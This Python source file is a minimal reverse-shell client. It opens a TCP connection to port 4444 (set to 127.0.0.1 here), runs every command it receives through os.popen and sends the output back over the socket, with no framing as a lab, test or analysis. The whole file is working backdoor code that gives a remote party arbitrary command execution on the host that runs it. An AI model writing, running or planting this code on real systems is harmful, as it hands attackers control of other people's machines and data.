#-*- coding: utf-8 -*-

import os,sys
from socket import *

class TcpClient:
    HOST = '127.0.0.1'
    PORT = 4444
    BUFSIZ = 1024
    ADDR=(HOST, PORT)
    def __init__(self):
        self.client = socket(AF_INET, SOCK_STREAM)
        self.client.connect(self.ADDR)
        while True:
            data = self.client.recv(1024)
            ME = os.popen(data.decode('utf8'))
            os_result = ME.read()
            #print(os_result)
            self.client.sendall(os_result)

                  
if __name__ == '__main__':
    client=TcpClient()
